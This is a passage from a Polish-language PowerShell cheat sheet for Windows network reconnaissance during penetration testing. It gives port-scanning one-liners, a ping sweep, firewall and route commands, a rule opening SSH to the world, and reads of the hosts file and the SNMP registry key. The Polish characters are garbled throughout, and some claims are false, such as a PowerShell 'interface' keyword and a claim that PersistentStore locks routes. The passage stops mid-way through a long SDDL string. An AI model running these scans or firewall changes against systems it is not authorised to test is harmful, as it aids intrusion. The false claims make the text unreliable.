- Skanowanie z wykorzystaniem specyficznych skrypt贸w:
```
nmap -sC <adres_ip>
```

Nmap oferuje wiele opcji i funkcji, kt贸re mo偶na dostosowa do konkretnych potrzeb. Warto zapozna si z dokumentacj Nmap, aby pozna wszystkie mo偶liwoci tego narzdzia.

#### Wyniki skanowania

Po przeprowadzeniu skanowania port贸w, otrzymasz wyniki, kt贸re bd zawiera informacje o otwartych portach, usugach dziaajcych na tych portach oraz ewentualnych lukiach w zabezpieczeniach. Analiza tych wynik贸w pozwoli Ci zidentyfikowa potencjalne zagro偶enia i podj odpowiednie dziaania w celu zabezpieczenia systemu.
```powershell
# Check Port or Single IP
Test-NetConnection -Port 80 10.10.10.10

# Check Port List in Single IP
80,443,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null

# Check Port Range in single IP
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null

# Check Port List in IP Lists - 80,443,445,8080
"10.10.10.10","10.10.10.11" | % { $a = $_; write-host "[INFO] Testing $_ ..."; 80,443,445,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("$a",$_)) "$a : $_ is open!"} 2>$null}

```
### Interfejsy

Interfejsy w PowerShell s u偶ywane do definiowania kontrakt贸w, kt贸re okrelaj, jakie metody i waciwoci powinny by dostpne w klasach implementujcych dany interfejs. Interfejsy s u偶ywane do tworzenia abstrakcyjnych typ贸w danych, kt贸re mog by implementowane przez r贸偶ne klasy.

Aby zdefiniowa interfejs w PowerShell, u偶yj sowa kluczowego `interface`. Nastpnie mo偶esz zadeklarowa metody i waciwoci, kt贸re powinny by dostpne w klasach implementujcych ten interfejs.

Przykad:

```powershell
interface IExampleInterface {
    [string] GetInfo()
    [void] DoSomething()
}
```

W powy偶szym przykadzie zdefiniowano interfejs o nazwie `IExampleInterface`, kt贸ry zawiera dwie metody: `GetInfo`, kt贸ra zwraca warto typu `string`, oraz `DoSomething`, kt贸ra nie zwraca 偶adnej wartoci.

Aby klasa moga implementowa interfejs, musi zadeklarowa, 偶e implementuje dany interfejs za pomoc sowa kluczowego `implements`. Nastpnie musi zaimplementowa wszystkie metody i waciwoci zdefiniowane w interfejsie.

Przykad:

```powershell
class ExampleClass : IExampleInterface {
    [string] GetInfo() {
        return "This is an example"
    }

    [void] DoSomething() {
        Write-Host "Doing something"
    }
}
```

W powy偶szym przykadzie klasa `ExampleClass` implementuje interfejs `IExampleInterface` poprzez zaimplementowanie metod `GetInfo` i `DoSomething`.

Interfejsy s przydatne w PowerShell, poniewa偶 umo偶liwiaj tworzenie kodu bardziej elastycznego i moduowego. Dziki nim mo偶na tworzy klasy, kt贸re s zgodne z danym interfejsem, co uatwia testowanie, rozwijanie i utrzymanie kodu.
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Zapora ogniowa

Firewall (zapora ogniowa) jest podstawowym narzdziem do zabezpieczania systemu przed nieautoryzowanym dostpem. Mo偶e by skonfigurowany w celu blokowania lub zezwalania na ruch sieciowy na podstawie okrelonych regu. Istniej dwa rodzaje zap贸r ogniowych: zapora sprztowa i zapora programowa.

#### Zapora sprztowa

Zapora sprztowa to urzdzenie fizyczne, kt贸re dziaa jako punkt kontrolny dla ruchu sieciowego. Jest umieszczona midzy sieci wewntrzn a zewntrzn i monitoruje i blokuje nieautoryzowany ruch. Zapory sprztowe s zazwyczaj bardziej wydajne i skuteczne ni偶 zapory programowe.

#### Zapora programowa

Zapora programowa to oprogramowanie zainstalowane na komputerze, kt贸re kontroluje ruch sieciowy. Mo偶e by skonfigurowana w celu blokowania lub zezwalania na ruch na podstawie okrelonych regu. Zapory programowe s bardziej elastyczne i mog by dostosowane do indywidualnych potrzeb.

#### Konfiguracja zapory ogniowej

Konfiguracja zapory ogniowej jest kluczowa dla zapewnienia bezpieczestwa systemu. Oto kilka podstawowych zasad konfiguracji:

- Zablokuj domylne reguy: Wycz wszystkie domylne reguy, kt贸re nie s potrzebne, aby ograniczy potencjalne luki w zabezpieczeniach.
- Zdefiniuj reguy dostpu: Okrel, jakie poczenia sieciowe s dozwolone i jakie s blokowane. Mo偶na to zrobi na podstawie adres贸w IP, port贸w, protoko贸w itp.
- Monitoruj ruch sieciowy: Regularnie sprawdzaj logi zapory ogniowej, aby wykry nieautoryzowany ruch i podejrzane aktywnoci.
- Aktualizuj oprogramowanie zapory ogniowej: Upewnij si, 偶e masz zainstalowane najnowsze aktualizacje oprogramowania zapory ogniowej, aby zapewni ochron przed nowymi zagro偶eniami.

#### Podsumowanie

Zapora ogniowa jest niezbdnym narzdziem do zabezpieczania systemu przed nieautoryzowanym dostpem. Bez odpowiedniej konfiguracji i monitorowania mo偶e wystawi system na ryzyko atak贸w. Pamitaj o regularnym aktualizowaniu oprogramowania zapory ogniowej i monitorowaniu ruchu sieciowego, aby utrzyma wysoki poziom bezpieczestwa.
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### Trasa

Poni偶ej znajduje si lista polece PowerShell, kt贸re mog by przydatne podczas testowania penetracyjnego system贸w Windows.

#### Pobieranie informacji o trasie

Polecenie `Get-NetRoute` pozwala na pobranie informacji o trasach sieciowych na hocie. Mo偶na u偶y go do sprawdzenia, czy istniej jakie nieprawidowe trasy lub trasy, kt贸re mog by wykorzystane do przechwycenia ruchu sieciowego.

```powershell
Get-NetRoute
```

#### Dodawanie trasy

Polecenie `New-NetRoute` umo偶liwia dodanie nowej trasy sieciowej. Mo偶e to by przydatne, jeli chcesz przekierowa ruch sieciowy przez inny wze lub sie.

```powershell
New-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastpnego skoku>
```

#### Usuwanie trasy

Polecenie `Remove-NetRoute` su偶y do usuwania istniejcych tras sieciowych.

```powershell
Remove-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastpnego skoku>
```

#### Modyfikowanie trasy

Polecenie `Set-NetRoute` pozwala na modyfikacj istniejcych tras sieciowych.

```powershell
Set-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastpnego skoku>
```

#### Przekierowywanie ruchu sieciowego

Aby przekierowa ruch sieciowy przez inny wze, mo偶na u偶y polecenia `Set-NetRoute` do dodania nowej trasy z odpowiednim adresem docelowym, indeksem interfejsu i adresem nastpnego skoku.

```powershell
Set-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastpnego skoku>
```

#### Zabezpieczanie tras

Aby zabezpieczy trasy przed modyfikacj, mo偶na u偶y polecenia `Set-NetRoute` z opcj `-PolicyStore PersistentStore`. Spowoduje to przechowywanie tras w trwaym magazynie, co uniemo偶liwi ich zmian po ponownym uruchomieniu systemu.

```powershell
Set-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastpnego skoku> -PolicyStore PersistentStore
```

#### Podsumowanie

Trasy sieciowe s wa偶nym elementem infrastruktury sieciowej. Zrozumienie, jak zarzdza trasami w systemie Windows, mo偶e by przydatne podczas testowania penetracyjnego. Polecenia PowerShell opisane powy偶ej mog pom贸c w pobieraniu, dodawaniu, usuwaniu, modyfikowaniu i zabezpieczaniu tras sieciowych.
```powershell
route print
```
### ARP

ARP (Address Resolution Protocol) jest protokoem u偶ywanym w sieciach komputerowych do mapowania adres贸w IP na adresy MAC. Protok贸 ARP jest wykorzystywany do komunikacji w warstwie 2 modelu OSI (Data Link Layer). 

Atak ARP Spoofing polega na faszowaniu odpowiedzi ARP w celu przekierowania ruchu sieciowego na inny adres MAC. Ten rodzaj ataku mo偶e by wykorzystany do przechwytywania danych, podsuchiwania komunikacji lub przeprowadzania innych zoliwych dziaa w sieci. 

Aby chroni si przed atakami ARP Spoofing, mo偶na zastosowa techniki takie jak:
- U偶ywanie protokou ARP Inspection w sieciach VLAN.
- Konfiguracja statycznych wpis贸w ARP w urzdzeniach sieciowych.
- U偶ywanie narzdzi do wykrywania i monitorowania atak贸w ARP Spoofing.
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### Hosty

W pliku hosts mo偶emy zdefiniowa statyczne mapowania adres贸w IP na nazwy host贸w. Jest to przydatne w celu przekierowania ruchu sieciowego na inne adresy IP lub do blokowania dostpu do okrelonych stron internetowych. Poni偶ej znajduje si przykadowa zawarto pliku hosts:

```plaintext
# Przykadowy plik hosts

# Adresy IP i nazwy host贸w
127.0.0.1       localhost
192.168.1.10    example.com
```

W powy偶szym przykadzie, adres IP 127.0.0.1 jest przypisany do nazwy hosta "localhost", co oznacza, 偶e wszelkie 偶dania wysane do "localhost" bd kierowane na ten adres IP. Podobnie, adres IP 192.168.1.10 jest przypisany do nazwy hosta "example.com".

Aby doda wasne mapowania do pliku hosts, nale偶y otworzy go jako administrator i doda nowe linie w formacie "adres_IP nazwa_hosta". Na przykad:

```plaintext
# Moje mapowania
192.168.1.20    myhost.com
```

Po zapisaniu zmian w pliku hosts, nowe mapowania bd obowizywa. Jest to przydatne narzdzie podczas testowania aplikacji internetowych lub w celu zablokowania dostpu do niechcianych stron internetowych.
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

Ping jest narzdziem wiersza polece, kt贸re su偶y do sprawdzania dostpnoci hosta w sieci. Wysya ono pakiet ICMP Echo Request do okrelonego hosta i oczekuje na odpowied藕 ICMP Echo Reply. Ping jest czsto u偶ywany do diagnozowania problem贸w z sieci, sprawdzania op贸藕nie i okrelania, czy dany host jest dostpny.

#### Skadnia

```powershell
ping [-t] [-a] [-n licznik] [-l rozmiar] [-f] [-i TTL] [-v TOS] [-r licznik] [-s 藕r贸do] [-w czas] [-R] [-S] [adres]
```

#### Parametry

- `-t` - Pinguje okrelony host w nieskoczono, a偶 zostanie przerwany przez u偶ytkownika.
- `-a` - Wywietla nazw hosta dla podanego adresu IP.
- `-n licznik` - Okrela liczb pakiet贸w do wysania.
- `-l rozmiar` - Okrela rozmiar pakietu w bajtach.
- `-f` - Ustawia flag Don't Fragment w pakietach ICMP Echo Request.
- `-i TTL` - Okrela warto pola Time to Live (TTL) w pakietach ICMP Echo Request.
- `-v TOS` - Okrela warto pola Type of Service (TOS) w pakietach ICMP Echo Request.
- `-r licznik` - Okrela liczb skok贸w (router贸w), kt贸re pakiet mo偶e wykona.
- `-s 藕r贸do` - Okrela adres 藕r贸dowy pakiet贸w ICMP Echo Request.
- `-w czas` - Okrela czas oczekiwania na odpowied藕 w milisekundach.
- `-R` - Wcza rejestrowanie cie偶ki pakiet贸w w odpowiedziach ICMP Echo Reply.
- `-S` - Wcza rejestrowanie adresu 藕r贸dowego w odpowiedziach ICMP Echo Reply.

#### Przykady u偶ycia

```powershell
ping google.com
ping -n 5 192.168.1.1
ping -t -w 1000 8.8.8.8
```

Ping jest przydatnym narzdziem do sprawdzania dostpnoci host贸w w sieci. Mo偶e by r贸wnie偶 u偶ywany w celach testowych i diagnostycznych.
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMP (Simple Network Management Protocol) jest protokoem sieciowym u偶ywanym do zarzdzania i monitorowania urzdze sieciowych. Pozwala na zdalne monitorowanie i kontrol urzdze takich jak routery, przeczniki, serwery itp. Protok贸 SNMP dziaa na zasadzie zapytania i odpowiedzi, gdzie zarzdzajcy urzdzenie wysya zapytanie do urzdzenia docelowego, a to zwraca odpowied藕 zawierajc informacje o swoim stanie i konfiguracji.

#### Komponenty SNMP

Protok贸 SNMP skada si z trzech g贸wnych komponent贸w:

1. **Zarzdzajcy** (Manager): Jest to urzdzenie lub aplikacja odpowiedzialna za monitorowanie i zarzdzanie urzdzeniami sieciowymi. Zarzdzajcy wysya zapytania do urzdze docelowych i odbiera odpowiedzi.

2. **Agent**: Jest to oprogramowanie lub modu zainstalowany na urzdzeniu docelowym, kt贸re odpowiada na zapytania zarzdzajcego. Agent monitoruje i zbiera informacje o stanie urzdzenia i przekazuje je do zarzdzajcego.

3. **MIB** (Management Information Base): Jest to baza danych zawierajca informacje o urzdzeniach sieciowych, kt贸re mog by monitorowane i zarzdzane za pomoc protokou SNMP. MIB definiuje struktur danych i dostpne parametry dla urzdze.

#### Rodzaje zapyta SNMP

Protok贸 SNMP obsuguje r贸偶ne rodzaje zapyta, kt贸re mog by wysyane przez zarzdzajcego do agenta. Najwa偶niejsze z nich to:

- **GET**: Zarzdzajcy wysya zapytanie GET do agenta, aby uzyska warto okrelonego parametru.

- **SET**: Zarzdzajcy wysya zapytanie SET do agenta, aby zmieni warto okrelonego parametru.

- **GETNEXT**: Zarzdzajcy wysya zapytanie GETNEXT do agenta, aby uzyska nastpny parametr w MIB.

- **GETBULK**: Zarzdzajcy wysya zapytanie GETBULK do agenta, aby uzyska wiele wartoci parametr贸w jednoczenie.

#### Zabezpieczenia SNMP

Protok贸 SNMP mo偶e by podatny na ataki, dlatego istniej r贸偶ne mechanizmy zabezpiecze, kt贸re mo偶na zastosowa, aby zminimalizowa ryzyko. Niekt贸re z tych mechanizm贸w to:

- **Community String**: Jest to haso u偶ywane do uwierzytelniania zarzdzajcego i agenta. Nale偶y zadba o silne haso i regularnie je zmienia.

- **Access Control**: Mo偶na skonfigurowa kontrol dostpu, aby okreli, kt贸re adresy IP maj uprawnienia do komunikacji z agentem.

- **SNMPv3**: Jest to najnowsza wersja protokou SNMP, kt贸ra wprowadza silniejsze mechanizmy uwierzytelniania i szyfrowania.

#### Podsumowanie

SNMP jest protokoem u偶ywanym do zarzdzania i monitorowania urzdze sieciowych. Skada si z zarzdzajcego, agenta i MIB. Protok贸 obsuguje r贸偶ne rodzaje zapyta, takie jak GET, SET, GETNEXT i GETBULK. Aby zabezpieczy SNMP, nale偶y korzysta z silnych hase, kontrolowa dostp i rozwa偶y u偶ycie SNMPv3.
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **Konwertowanie cigu SDDL na czytelny format**

To convert the SDDL string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to convert the Security Descriptor Definition Language (SDDL) string into an object that can be easily read and understood.

Here is an example of how to use the `ConvertFrom-SddlString` cmdlet:

```powershell
$sddlString = "O:BAG:BAD:(A;;0x1;;;S-1-5-32-544)(A;;0x1;;;S-1-5-18)"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

This will output the converted SDDL string in a readable format, showing the various access control entries (ACEs) and their corresponding permissions.

By using this cmdlet, you can quickly analyze and understand the permissions set in the SDDL string, which can be useful for troubleshooting or auditing purposes.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-